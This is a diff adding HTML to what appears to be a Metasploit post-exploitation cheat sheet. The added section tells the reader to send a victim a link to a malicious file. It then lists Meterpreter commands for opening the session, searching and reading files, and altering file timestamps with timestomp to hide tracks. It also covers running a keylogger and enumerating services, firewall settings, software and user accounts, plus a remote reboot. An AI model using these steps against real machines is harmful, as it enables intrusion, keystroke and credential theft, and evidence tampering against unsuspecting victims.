@@ -25,3 +25,47 @@
     <ul>show options -> take note of the listening port</ul>
   <ul>exploit -j -z</ul>
 </ol></p>
+<h2>Attack</h2>
+<p>Send a link to the victim in order to open the malicious file</p>
+<h2>Meterpreter shell</h2>
+<p><ol><ul>sessions -i 1</ul>
+<ul>sysinfo</ul>
+<ul>ipconfig</ul>
+<ul>getuid</ul>
+<ul>pwd</ul>
+</ol></p>
+    <h2>Search files</h2>
+    <p><ol>
+        <ul>cd C:\</ul>
+        <ul>search -f [Filename.extension] </ul></ol></p>
+    <h2>Read files</h2>
+    <p><ol><ul>
+        cat [FILENAME]
+    </ul></ol></p>
+    <h2>Change MACE</h2>
+    <p><ol><ul>
+        timestomp [FILENAME] -m “02/11/2018 08:10:03” (modified time)
+    </ul>
+        <ul>timestomp [FILENAME] -v</ul>
+        <ul>timestomp -a -> accessed time</ul>
+        <ul>timestomp -c -> created time</ul>
+        <ul>timestomp -e -> entry modified time</ul>
+    </ol></p>
+    <h2>Keylogger</h2>
+    <p><ol><ul>keyscan_start</ul>
+    <ul>let the keylogger run for a while</ul>
+    <ul>keyscan_dump</ul></ol></p>
+    <h2>Check Idletime</h2>
+    <p><ol><ul>idletime</ul></ol></p>
+    <h2>Hidden attributes</h2>
+    <p><ol><ul>dir /a:h</ul></ol></p>
+        <h2>Available services</h2>
+    <p><ol><ul>sc queryex type=service state=all</ul>
+    <ul>netsh firewall show state</ul>
+    <ul>netsh firewall show config</ul></ol></p>
+    
+        <h2>Installed software etc.</h2>
+    <p><ol><ul>wmic /node:"" product get name,version,vendor</ul>
+    <ul>wmic cpu get (cpu)</ul>
+    <ul>wmic useraccount get name,sid (user accounts)</ul>
+    <ul>wmic os where Primary='TRUE' reboot (reboot)</ul></ol></p>
